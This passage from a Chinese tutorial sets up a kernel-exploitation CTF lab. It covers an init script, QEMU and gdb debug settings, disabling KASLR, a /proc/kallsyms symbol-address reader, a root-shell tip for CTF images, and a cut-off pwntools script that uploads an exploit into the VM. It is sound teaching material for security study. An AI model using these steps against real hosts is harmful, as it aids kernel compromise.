<h5 id="配置-init-启动脚本"><a href="#配置-init-启动脚本" class="headerlink" title="配置 init 启动脚本"></a>配置 init 启动脚本</h5><p><code>init</code> 进程是类 UNIX 操作系统中最初启动的进程，也是系统的祖先进程，所有其他进程都是它的子孙进程。<code>init</code> 进程的 PID（进程号）为 <code>1</code>，是操作系统中的第一个用户级进程。</p>
<p>在 Linux 系统中，<code>init</code> 进程负责系统启动后的初始化工作，包括启动系统服务、挂载文件系统、设置网络等。它通过读取配置文件来启动其他系统进程，因此 <code>init</code> 是系统正常运行的基础。</p>
<p><code>init</code> 进程的配置方式有多种，它随着操作系统的版本、架构以及具体使用的初始化系统（如 <code>SysVinit</code>、<code>Upstart</code>、<code>systemd</code> 等）而有所不同。每种方式都通过不同的配置文件和机制来管理系统启动、服务管理、进程监控等任务。</p>
<p>当然，对于我们搭建的简易 Linux 环境，由于不涉及复杂的系统服务启动和初始化，因此只需要配置一个简单的 shell 脚本作为 <code>init</code> 进程。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>首先我们需要挂载一下基本的<strong>虚拟文件系统</strong>。</p>
<ul>
<li><p><code>proc</code>：提供进程信息的虚拟文件系统。</p>
</li>
<li><p><code>sysfs</code>：提供内核设备信息和其它相关系统信息的虚拟文件系统。</p>
</li>
<li><p><code>devtmpfs</code>：用于自动创建设备文件，如 <code>/dev/null</code>、<code>/dev/zero</code> 等，且自动管理设备节点。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>自定义标题</p>

    </div>
    <div class="notel-content">
      <p>注意，<code>hda</code> 类型的磁盘在内核启动阶段自动挂载 <code>devtmpfs</code>，不需要在 <code>init</code> 脚本中进行。</p>

    </div>
  </div>
</li>
<li><p><code>tmpfs</code>：一个临时的文件系统，通常用于存放临时文件。</p>
</li>
</ul>
</li>
<li><p>之后我们可能会加载一下需要的驱动或者挂载一些必要的设备。例如示例中挂载了一个伪终端设备 <code>ptmx</code>，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，为一些内核利用创造了条件。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>启动一个 shell 进程，并将它绑定到终端上，允许用户登录系统。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid cttyhack setuidgid 1000 sh</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>setsid</code>：启动一个新的会话，通常用于启动后台进程。</p>
</li>
<li><p><code>cttyhack</code>：这个命令用于确保新的终端会话能够获取控制终端。它是 <code>init</code> 进程启动 shell 时用来保证 shell 进程可以与终端交互的工具。</p>
<blockquote>
<p><strong>控制终端</strong>（Control Terminal，简称 TTY）是 Unix 和类 Unix 系统中的一个概念，用于描述用户和操作系统之间的交互界面。它是一个终端设备（例如控制台、虚拟终端、伪终端等），允许用户通过输入命令与系统交互，并输出运行结果。</p>
</blockquote>
</li>
<li><p><code>setuidgid 1000</code>：这个命令是 <code>runit</code> 工具中的一部分，用于设置进程的 UID 和 GID，这里将 UID 和 GID 设置为 1000。UID 1000 通常是第一个普通用户的 UID（通常是用户 <code>user</code>）。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>在 ctf 题目中可以把 1000 改成 0 然后重新打包文件系统，这样启动系统之后可以获得一个 root 权限的 shell，从而可以完成查看符号地址等一些高权限行为。</p>

    </div>
  </div>
</li>
<li><p><code>sh</code>：执行一个 shell，用户可以与系统进行交互。</p>
</li>
</ul>
</li>
<li><p>设置 shell 退出后关机。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>-d 0</code>：指定关闭延迟为 0，即立刻关闭。</li>
<li><code>-f</code>：强制关闭，不进行正常关机过程中的清理工作。</li>
</ul>
</li>
</ol>
<p>当我们不配置 <code>init</code> 脚本路径的时候，对于 <code>hda</code> 类型的文件系统，会尝试把 <code>/sbin/init</code> 作为 <code>init</code> 进程对应的可执行程序。而</p>
<p>busybox 在 <code>/sbin/init</code> 提供了一个可执行程序，这个程序会按照对应的配置进行系统的初始化操作。busybox 的 <code>init</code> 配置比较简单，配置文件位于 <code>/etc/inittab</code> 和 <code>/etc/init.d/</code> 中。</p>
<p>首先配置 <code>etc/inttab</code> ，写入如下内容：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure></div>

<p>这些内容中最关键的是 <code>::sysinit:/etc/init.d/rcS</code>，它指定了 <code>/etc/init.d/rcS</code> 作为系统启动脚本。</p>
<p>我们只需要在 <code>/etc/init.d/rcS</code> 写入 <code>init</code> 进程启动脚本就行。所以这种配置方式本质上还是前一种方法，跟 busybox 的初始化系统关系不大。</p>
<h4 id="配置用户组"><a href="#配置用户组" class="headerlink" title="配置用户组"></a>配置用户组</h4><p>在 <code>/etc/passwd</code> 中创建两个用户：<code>root</code> 和 <code>ctf</code>。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/sh</span><br><span class="line">ctf:x:1000:1000:ctf:/home/ctf:/bin/sh</span><br></pre></td></tr></table></figure></div>

<p>在 <code>/etc/group</code> 中创建两个用户：<code>root</code> 和 <code>ctf</code>。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:</span><br><span class="line">ctf:x:1000:</span><br></pre></td></tr></table></figure></div>

<h2 id="运行与调试"><a href="#运行与调试" class="headerlink" title="运行与调试"></a>运行与调试</h2><h3 id="内核启动"><a href="#内核启动" class="headerlink" title="内核启动"></a>内核启动</h3><p>内核启动脚本负责启动一个简易的 linux 环境。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 64M \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -cpu kvm64,+smep \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  --nographic \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 nokaslr pti=1 quiet oops=panic panic=1&#x27;</span> \</span><br><span class="line">  -enable-kvm</span><br></pre></td></tr></table></figure></div>

<p>在用 qemu-system 启动内核时，常用的选项如下</p>
<ul>
<li><p><code>-m</code>：指定内存大小，默认 384MB。</p>
</li>
<li><p><code>-kernel</code>：指定内核镜像文件。</p>
</li>
<li><p><code>-initrd</code>：指定初始内存磁盘，用于启动时加载必要的文件系统和驱动。</p>
</li>
<li><p><code>-smp [cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]</code>：用于设置虚拟机使用的 CPU 数量和拓扑结构。</p>
<ul>
<li><code>cores=n</code>：指定 CPU 核心数。</li>
<li><code>threads=n</code>：指定 CPU 每个核心的线程数。</li>
<li><code>sockets=n</code>：指定 CPU 插槽数。</li>
<li><code>dies=n</code>：设置 CPU die 数。</li>
<li><code>maxcpus=n</code>：指定最大 CPU 数目，适用于多核虚拟化。</li>
</ul>
</li>
<li><p><code>-cpu</code>：指定指定要模拟的处理器架构，可以同时开启一些保护。</p>
<ul>
<li><code>kvm64</code>：指定虚拟机使用 KVM 模拟的 64 位 CPU 类型。这个参数并不意味着并不意味着开启了 KVM 虚拟化加速，KVM 的启用需要通过 <code>-enable-kvm</code> 参数来显式开启。但是一些特性例如 KPTI 是可以支持的。</li>
<li><code>+smap</code>：开启 <strong>SMAP</strong>（Supervisor Mode Access Prevention）保护，用于防止内核访问用户空间数据。</li>
<li><code>+smep</code>：启用 <strong>SMEP</strong>（Supervisor Mode Execution Protection），这是 Intel 或 AMD 处理器的一种安全功能，可以防止内核从用户空间执行代码，增强系统的安全性。</li>
</ul>
</li>
<li><p><code>-nographic</code>：禁用 QEMU 的图形界面输出。使用此选项时，虚拟机的输出将通过当前终端显示，而不是在图形窗口中呈现。</p>
</li>
<li><p><code>-monitor</code>：对 qemu 提供的控制台进行重定向，如果没有设置的话，可以直接进入控制台。</p>
<ul>
<li><code>-monitor /dev/null</code> 后 <code>Ctrl + c</code> 可以直接退出 QEMU，因为此时 QEMU 不会启动监控控制台，终端的输入会直接传递给 QEMU 进程。<code>Ctrl+C</code> 信号就直接发送给 QEMU，导致 QEMU 退出。</li>
</ul>
</li>
<li><p><code>-append</code>：向内核传递命令行参数，可以在 <code>/proc/cmdline</code> 中查看当前内核的命令行参数。另外在内核源码的 <code>Documentation/admin-guide/kernel-parameters.txt</code> 有详细的内核参数说明。这里列举几个常见的内核参数：</p>
<ul>
<li><p><code>nokaslr</code>：禁用内核地址空间布局随机化（KASLR）。</p>
</li>
<li><p><code>pti=1/0</code>：启用或禁用内核页表隔离（KPTI）。</p>
</li>
<li><p><code>console=ttyS0</code>：和 nographic 一起使用，启动的界面就变成了当前终端。</p>
<blockquote>
<p><code>ttyS0</code> 是第一个串行端口（通常是 <code>/dev/ttyS0</code>）。在 QEMU 中，<code>ttyS0</code> 是虚拟化的串行端口。QEMU 创建了一个虚拟串行端口设备，用于与虚拟机交互，类似于物理机器上的串行端口。</p>
</blockquote>
</li>
<li><p><code>quiet</code>：不打印内核日志信息。</p>
</li>
<li><p><code>oops=panic</code>：当内核遇到错误时立即触发 panic，导致系统崩溃并重启，而不是继续执行。</p>
</li>
<li><p><code>panic=1</code>：当内核触发 panic 时，系统将立即重新启动，而不是让系统停机。这样可以在发生内核崩溃时尽快恢复。</p>
</li>
</ul>
</li>
<li><p><code>-enable-kvm</code>：QEMU 会尝试利用 KVM 加速来提升虚拟机的性能，前提是主机支持 KVM，并且要以管理员权限启动 QEMU。</p>
</li>
</ul>
<p>安装 qemu 后运行启动脚本即可启动 linux 系统。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu-system -y</span><br></pre></td></tr></table></figure></div>

<h3 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h3><h4 id="关键地址的获取方法"><a href="#关键地址的获取方法" class="headerlink" title="关键地址的获取方法"></a>关键地址的获取方法</h4><h5 id="获取模块基址的方法"><a href="#获取模块基址的方法" class="headerlink" title="获取模块基址的方法"></a>获取模块基址的方法</h5><ul>
<li><p><code>lsmod</code> 命令列出了所有加载的模块及其相关信息，其中就包含了模块基址。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod | grep &lt;module_name&gt;</span><br></pre></td></tr></table></figure></div>

<p>例如：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># lsmod</span></span><br><span class="line">hello 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>查看 <code>/sys/module</code> 中的段信息。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/module/&lt;module_name&gt;/sections/.text</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h5 id="获取内核符号的方法"><a href="#获取内核符号的方法" class="headerlink" title="获取内核符号的方法"></a>获取内核符号的方法</h5><p><code>/proc/kallsyms</code> 是 Linux 内核中的一个虚拟文件，它包含了内核中所有符号（函数、变量等）的名称、地址和类型信息。这个文件是内核调试、符号查找和分析的一个重要工具。这里给出从 <code>/proc/kallsyms</code> 获取符号地址的 C 代码模板。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">get_symbol_address</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *symbol_name)</span> &#123;</span><br><span class="line">    FILE *kallsyms_fp = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kallsyms_fp) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open /proc/kallsyms&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> symbol_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x80</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">while</span> (!symbol_addr &amp;&amp; fgets(buf, <span class="keyword">sizeof</span>(buf), kallsyms_fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, symbol_name)) &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx %*s %*s&quot;</span>, &amp;symbol_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(kallsyms_fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (symbol_addr) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] symbol address: %#016llx\n&quot;</span>, symbol_addr);</span><br><span class="line">        <span class="keyword">return</span> symbol_addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to get symbol address.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="获取内核基址的方法"><a href="#获取内核基址的方法" class="headerlink" title="获取内核基址的方法"></a>获取内核基址的方法</h5><p>可以利用符号 <code>_text</code> 来确定内核加载的起始地址。<code>_text</code> 是内核代码段的起始符号，它通常位于内核的起始地址位置。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;T _text&quot;</span> /proc/kallsyms</span><br></pre></td></tr></table></figure></div>

<h5 id="数据显示相关保护"><a href="#数据显示相关保护" class="headerlink" title="数据显示相关保护"></a>数据显示相关保护</h5><p><strong>Dmesg Restrictions</strong></p>
<p><code>/proc/sys/kernel/dmesg_restrict</code> 是一个用于控制内核日志访问权限的 Linux 内核参数，该参数控制了普通用户能否通过 <code>dmesg</code> 命令查看内核日志。</p>
<ul>
<li>**值为 <code>0</code>**：默认情况下，所有用户都可以查看内核日志（包括普通用户）。</li>
<li>**值为 <code>1</code>**：限制普通用户访问内核日志，只有 <code>root</code> 用户（或具有相应权限的用户）才能查看。</li>
</ul>
<p><strong>Kernel Address Display Restriction</strong></p>
<p>内核提供控制变量 <code>/proc/sys/kernel/kptr_restrict</code> 用于控制系统中涉及内核地址的一些输出打印。</p>
<ul>
<li><code>kptr_restrict == 2</code> :内核将符号地址打印为全 0 , root 和普通用户都没有权限。</li>
<li><code>kptr_restrict == 1</code> : root 用户有权限读取，普通用户没有权限。</li>
<li><code>kptr_restrict == 0</code> : root 和普通用户都可以读取</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p><code>dmesg</code> 中的内核地址显示不受 <code>kptr_restrict</code> 影响。</p>

    </div>
  </div>

<h4 id="QEMU-仿真的简易-Linux-环境"><a href="#QEMU-仿真的简易-Linux-环境" class="headerlink" title="QEMU 仿真的简易 Linux 环境"></a>QEMU 仿真的简易 Linux 环境</h4><p>首先需要对内核启动脚本做如下修改，使其支持和方便 gdb 调试。</p>
<ul>
<li>在内核启动参数即 qemu-system 中 <code>-append</code> 参数中添加 <code>nokaslr</code> 关闭内核地址随机化，方便下断点。</li>
<li>添加 gdb 调试端口：<ul>
<li><code>-gdb tcp::&lt;port&gt;</code>：开启 gdb 调试端口，例如 <code>-gdb tcp::1337</code>，gdb 连接该本地 <code>1337</code> 端口即可调试 qemu 仿真的 linux 系统。</li>
<li><code>-s</code>：<code>-gdb tcp::1234</code> 的简写。</li>
<li><code>-S</code>（可选）：会在启动时暂停虚拟机，直到 GDB 连接。</li>
</ul>
</li>
</ul>
<p>具体修改内容如下：</p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- ./boot.sh	2024-12-06 15:30:58.306382140 +0800</span></span><br><span class="line"><span class="comment">+++ ./boot-debug.sh	2024-12-06 15:31:32.488855596 +0800</span></span><br><span class="line"><span class="meta">@@ -1,12 +1,13 @@</span></span><br><span class="line"> #!/bin/bash</span><br><span class="line"> </span><br><span class="line"> qemu-system-x86_64 \</span><br><span class="line">   -m 64M \</span><br><span class="line">   -kernel bzImage \</span><br><span class="line">   -initrd rootfs.cpio \</span><br><span class="line">   -smp cores=1,threads=1 \</span><br><span class="line">   -cpu kvm64,+smep \</span><br><span class="line">   -monitor /dev/null \</span><br><span class="line">   --nographic \</span><br><span class="line"><span class="deletion">-  -append &#x27;console=ttyS0 root=/dev/ram kaslr pti=on quiet oops=panic panic=1&#x27; \</span></span><br><span class="line"><span class="deletion">-  -enable-kvm</span></span><br><span class="line"><span class="addition">+  -append &#x27;console=ttyS0 root=/dev/ram nokaslr pti=on quiet oops=panic panic=1&#x27; \</span></span><br><span class="line"><span class="addition">+  -enable-kvm \</span></span><br><span class="line"><span class="addition">+  -s</span></span><br></pre></td></tr></table></figure></div>

<p>然后为了方便调试，这里直接使用 shell 脚本 <code>gdb.sh</code> 启动 gdb 调试。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gdb -q \</span><br><span class="line">  -ex <span class="string">&quot;file ./vmlinux&quot;</span> \  <span class="comment"># 加载内核映像，&#x27;vmlinux&#x27; 是编译后的内核映像，包含调试符号</span></span><br><span class="line">  -ex <span class="string">&quot;add-symbol-file <span class="subst">$(find . -name babydriver.ko)</span> 0xffffffffc0000000&quot;</span> \  <span class="comment"># 加载内核模块的符号文件 &#x27;babydriver.ko&#x27;，并指定基址</span></span><br><span class="line">  -ex <span class="string">&quot;dir ../linux-4.4.72&quot;</span> \  <span class="comment"># 添加内核源代码目录，这样可以让 GDB 找到源码文件进行源码级调试</span></span><br><span class="line">  -ex <span class="string">&quot;target remote localhost:1234&quot;</span> \  <span class="comment"># 连接到 QEMU 中的 GDB 服务器，监听端口 1234</span></span><br><span class="line">  -ex <span class="string">&quot;b babyopen&quot;</span> \  <span class="comment"># 设置断点，在内核中的 &#x27;babyopen&#x27; 函数处断点</span></span><br><span class="line">  -ex <span class="string">&quot;c&quot;</span>  <span class="comment"># 开始继续执行</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p><code>gdb.sh</code> 必须以 root 权限启动，否则部分调试功能结果可能有误（例如 <code>vmmap</code>)。</p>

    </div>
  </div>

<ul>
<li><code>-ex &quot;file ./vmlinux&quot;</code>: 加载内核镜像 <code>vmlinux</code> 中的符号。其中 vmlinux 是未压缩的 linux 内核镜像文件，关于它的获取后面有专门的讲解。</li>
<li><code>-ex &quot;add-symbol-file $(find . -name babydriver.ko) 0xffffffffc0000000&quot;</code>：这行用于加载内核模块 <code>babydriver.ko</code> 的调试符号，并指定该模块在内核中的加载地址（<code>0xffffffffc0000000</code>）。</li>
</ul>
<h4 id="Vmware-运行的完整-Linux-系统"><a href="#Vmware-运行的完整-Linux-系统" class="headerlink" title="Vmware 运行的完整 Linux 系统"></a>Vmware 运行的完整 Linux 系统</h4><p>编辑 <code>/etc/default/grub</code>，在 <code>GRUB_CMDLINE_LINUX</code> 选项添加 <code>nokaslr</code> 内核参数关闭内核地址随机化。</p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- /etc/default/grub.bak	2024-12-10 10:49:05.733806632 +0800</span></span><br><span class="line"><span class="comment">+++ /etc/default/grub	2024-12-10 10:30:23.302397655 +0800</span></span><br><span class="line"><span class="meta">@@ -8,7 +8,7 @@</span></span><br><span class="line"> GRUB_TIMEOUT=0</span><br><span class="line"> GRUB_DISTRIBUTOR=`( . /etc/os-release; echo $&#123;NAME:-Ubuntu&#125; ) 2&gt;/dev/null || echo Ubuntu`</span><br><span class="line"> GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash&quot;</span><br><span class="line"><span class="deletion">-GRUB_CMDLINE_LINUX=&quot;&quot;</span></span><br><span class="line"><span class="addition">+GRUB_CMDLINE_LINUX=&quot;nokaslr&quot;</span></span><br><span class="line"> </span><br><span class="line"> # If your computer has multiple operating systems installed, then you</span><br><span class="line"> # probably want to run os-prober. However, if your computer is a host</span><br></pre></td></tr></table></figure></div>

<p>之后更新 GRUB 配置（不同的 Linux 发行版可能略有不同）。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-grub</span><br></pre></td></tr></table></figure></div>

<p>关机之后在 vmx 文件中添加如下内容，使得虚拟机支持远程调试：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest64 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest64.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest64 = &quot;12345&quot;</span><br><span class="line">debugStub.listen.guest32 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest32.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest32 = &quot;12346&quot;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>在编辑 vmx 文件的时候<strong>一定</strong>要确保虚拟机处于<strong>关机</strong>状态，否则不会生效。</p>

    </div>
  </div>

<h3 id="远程-exp-传输"><a href="#远程-exp-传输" class="headerlink" title="远程 exp 传输"></a>远程 exp 传输</h3><p>通常 buxybox 中有 <code>wget</code>、<code>curl</code>、<code>tftp</code>、<code>nc</code> 等可以传输文件的工具。不过很多时候出题人没有在 qemu 启动脚本中给 linux 虚拟环境配置网络，也就是说我们只能与 linux 环境的终端交互，而不能让该 linux 环境与本地建立链接传输文件。</p>
<p>因此我们只能通过终端往里写文件，常用的传输脚本如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> rich.progress <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;, 1337)</span></span><br><span class="line">p = process([<span class="string">&#x27;./run.sh&#x27;</span>])</span><br><span class="line">chunk_size = <span class="number">0x200</span></span><br><span class="line">banner = <span class="string">b&quot;/ $&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read()).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Progress(</span><br><span class="line">    TextColumn(<span class="string">&quot;[bold blue]&#123;task.description&#125;&quot;</span>),</span><br><span class="line">    BarColumn(),</span><br><span class="line">    <span class="string">&quot;[progress.percentage]&#123;task.percentage:&gt;3.0f&#125;%&quot;</span>,</span><br><span class="line">    TextColumn(<span class="string">&quot;[bold green]&#123;task.completed&#125; / 